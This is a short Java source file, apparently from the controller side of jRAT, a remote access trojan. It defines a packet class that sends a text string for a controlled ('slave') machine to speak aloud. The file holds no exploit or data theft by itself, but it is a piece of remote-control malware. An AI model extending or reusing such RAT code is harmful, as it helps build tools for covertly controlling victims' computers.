package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet76Speech extends AbstractOutgoingPacket {

	private String text;

	public Packet76Speech(String text) {
		this.text = text;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(text);
	}

	@Override
	public short getPacketId() {
		return 76;
	}

}
